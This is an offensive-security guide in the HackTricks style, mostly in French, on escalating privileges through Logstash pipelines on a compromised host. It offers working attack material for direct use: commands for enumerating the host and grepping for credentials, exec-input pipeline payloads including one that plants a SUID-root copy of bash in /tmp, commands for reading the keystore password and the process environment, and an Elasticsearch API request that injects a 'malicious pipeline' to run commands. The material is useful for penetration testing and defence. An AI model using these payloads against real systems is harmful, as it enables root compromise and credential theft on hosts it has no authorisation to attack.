# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash est utilisé pour **collecter, transformer et acheminer des logs** via un système connu sous le nom de **pipelines**. Ces pipelines sont composés des étapes **input**, **filter** et **output**. Un aspect intéressant apparaît lorsque Logstash fonctionne sur une machine compromise.

### Configuration des pipelines

Les pipelines sont configurés dans le fichier **/etc/logstash/pipelines.yml**, qui répertorie les emplacements des configurations de pipeline :
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ce fichier révèle où se trouvent les fichiers **.conf**, contenant les configurations de pipeline.

Lors de l'utilisation d'un **Elasticsearch output module**, il est courant que les **pipelines** incluent des **Elasticsearch credentials**, qui possèdent souvent des privilèges étendus en raison du besoin de Logstash d'écrire des données dans Elasticsearch. Les wildcards dans les chemins de configuration permettent à Logstash d'exécuter tous les pipelines correspondants dans le répertoire désigné.

Si Logstash est démarré avec `-f <directory>` au lieu de `pipelines.yml`, **tous les fichiers à l'intérieur de ce répertoire sont concaténés dans l'ordre lexicographique et interprétés comme une configuration unique**. Cela entraîne deux implications offensives :

- Un fichier déposé tel que `000-input.conf` ou `zzz-output.conf` peut changer la façon dont le pipeline final est assemblé
- Un fichier malformé peut empêcher le chargement de l'ensemble du pipeline, donc validez soigneusement les payloads avant de compter sur l'auto-reload

### Énumération rapide sur un hôte compromis

Sur une machine où Logstash est installé, inspectez rapidement :
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Vérifiez également si l'API de monitoring locale est accessible. Par défaut, elle écoute sur **127.0.0.1:9600**, ce qui est généralement suffisant après avoir obtenu un accès sur l'hôte :
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- Possess **write access** to a pipeline **.conf** file **or**
- The **/etc/logstash/pipelines.yml** file uses a wildcard, and you can write to the target folder

Additionally, **one** of these conditions must be fulfilled:

- Capability to restart the Logstash service **or**
- The **/etc/logstash/logstash.yml** file has **config.reload.automatic: true** set

Given a wildcard in the configuration, creating a file that matches this wildcard allows for command execution. For instance:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ici, **interval** détermine la fréquence d'exécution en secondes. Dans l'exemple donné, la commande **whoami** s'exécute toutes les 120 secondes, sa sortie étant dirigée vers **/tmp/output.log**.

Avec **config.reload.automatic: true** dans **/etc/logstash/logstash.yml**, Logstash détectera et appliquera automatiquement les configurations de pipeline nouvelles ou modifiées sans redémarrage. Si aucun wildcard n'est utilisé, des modifications peuvent encore être apportées aux configurations existantes, mais la prudence est de mise pour éviter des perturbations.

### Payloads de pipeline plus fiables

Le plugin d'entrée `exec` fonctionne toujours dans les versions actuelles et nécessite soit un `interval`, soit un `schedule`. Il s'exécute en **forking** de la JVM Logstash, donc si la mémoire est limitée votre payload peut échouer avec `ENOMEM` au lieu de s'exécuter silencieusement.

Un payload de privilege-escalation plus pratique est généralement celui qui laisse un artefact durable :
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si vous n'avez pas les droits de redémarrage mais pouvez signaler le processus, Logstash prend aussi en charge un rechargement déclenché par **SIGHUP** sur les systèmes de type Unix :
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Soyez conscient que tous les plugins ne supportent pas le rechargement automatique. Par exemple, l'entrée **stdin** empêche le rechargement automatique, donc ne présumez pas que `config.reload.automatic` prendra toujours en compte vos modifications.

### Voler les secrets de Logstash

Avant de vous concentrer uniquement sur l'exécution de code, récoltez les données auxquelles Logstash a déjà accès :

- Les identifiants en clair sont souvent codés en dur dans les outputs `elasticsearch {}`, `http_poller`, les inputs JDBC ou les paramètres liés au cloud
- Les paramètres sécurisés peuvent se trouver dans **`/etc/logstash/logstash.keystore`** ou dans un autre répertoire `path.settings`
- Le mot de passe du keystore est fréquemment fourni via **`LOGSTASH_KEYSTORE_PASS`**, et les installations par paquet l'extraient souvent depuis **`/etc/sysconfig/logstash`**
- L'expansion des variables d'environnement avec `${VAR}` est résolue au démarrage de Logstash, donc l'environnement du service mérite d'être inspecté

Vérifications utiles :
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ceci mérite aussi d’être vérifié car **CVE-2023-46672** a montré que Logstash pouvait enregistrer des informations sensibles dans les logs dans des circonstances spécifiques. Sur un hôte en post-exploitation, d'anciens logs Logstash et des entrées `journald` peuvent donc divulguer des identifiants même si la configuration actuelle référence le keystore au lieu de stocker les secrets inline.

### Abus de la gestion centralisée des pipelines

Dans certains environnements, l'hôte ne dépend **pas** du tout des fichiers locaux `.conf`. Si **`xpack.management.enabled: true`** est configuré, Logstash peut récupérer des pipelines gérés centralement depuis Elasticsearch/Kibana, et après activation de ce mode les configs locales de pipeline ne sont plus la source de vérité.

Cela signifie un chemin d'attaque différent :

1. Récupérer les identifiants Elastic depuis les paramètres locaux de Logstash, le keystore, ou les logs
2. Vérifier si le compte possède le privilège de cluster **`manage_logstash_pipelines`**
3. Créer ou remplacer un pipeline géré centralement afin que l'hôte Logstash exécute votre payload lors de son prochain intervalle de sondage

L'API Elasticsearch utilisée pour cette fonctionnalité est :
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ceci est particulièrement utile lorsque les fichiers locaux sont en lecture seule mais que Logstash est déjà enregistré pour récupérer des pipelines à distance.

## Références

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
